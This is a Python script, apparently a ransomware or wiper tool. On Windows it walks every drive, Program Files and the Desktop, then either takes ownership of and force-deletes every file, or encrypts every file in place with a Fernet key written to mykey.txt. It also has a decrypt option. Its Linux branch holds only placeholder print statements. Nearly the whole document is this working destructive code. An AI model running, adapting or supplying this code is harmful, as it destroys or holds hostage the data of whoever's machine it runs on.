import os
import subprocess
import platform
from cryptography.fernet import Fernet
from string import ascii_uppercase

def get_windrives_filenames():
    drives = []
    file_paths = []
    for drive in ascii_uppercase:
        if os.path.exists(os.path.join(str(drive) + ":\\")):
            drives.append(str(drive) + ":\\")

    for i, drive in enumerate(drives):
        if(drive in os.getenv('windir') and not drive == ''):
            progf86_path = drive + 'Program Files (x86)\\' 
            progf_path = drive + 'Program Files\\'
            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')

            drives.append(progf86_path)
            drives.append(progf_path)
            drives.append(desktop_path)
            drives.pop(i)
    for drive in drives:
        for root, _, filenames in os.walk(drive):
            for filename in filenames:
                file_paths.append(os.path.join(root, filename))
    
    return [drives, file_paths]


if(platform.system() == 'Windows'):
    print("Windows OS discovered.")
    delenc_choice = input('Delete/Encrypt/Decrypt all files? ').lower()
    sys32_path = os.path.join(os.getenv("windir"), "System32")
    drives, file_paths = get_windrives_filenames()
    
    if(delenc_choice == 'delete'):
        print('Starting deletion process...')

        for file in file_paths:
            subprocess.run(['takeown', r'/f', file])
            subprocess.run(['DEL', r'/F', r'/A', file])

        print('Deletion process finished.')

    elif(delenc_choice == 'encrypt'):
        print('Starting Encryption process...')

        key = Fernet.generate_key()
        keyfunc = Fernet(key)


        print('Initiating encryption on ' + str(drives) + '...')

        with open('mykey.txt', 'wb') as mykey:
            mykey.write(key)

        for file in file_paths:
            with open(file, 'rb') as original_file:
                original = original_file.read()

            encrypted_version = keyfunc.encrypt(original)

            with open(file, 'wb') as original_file:
                original_file.write(encrypted_version)
            
    elif(delenc_choice == 'decrypt'):
        key = input('What is the decryption key? ')
        keyfunc = Fernet(key)

        print('Starting decyrption process...')

        for file in file_paths:
            with open(file, 'rb') as encrypted_file:
                encrypted = encrypted_file.read()

            decrypted_version = keyfunc.decrypt(encrypted)

            with open(file, 'wb') as encrypted_file:
                encrypted_file.write(decrypted_version)
        



    else:
        print('Invalid input. Exiting.')


        
        



        

if(platform.system() == 'Linux'):
    print('Linux OS discovered.')
    choice = input('Delete/Encrypt/Decrypt all files? ').lower()

    if(choice == 'delete'):
        print('Deleting all files that this user has privilages to access.')


    if(choice == 'encrypt'):
        print('Encrypting all files that this user has privilages to access')


    if(choice == 'decrypt'):
        key = input('What is the decryption key? ')
    


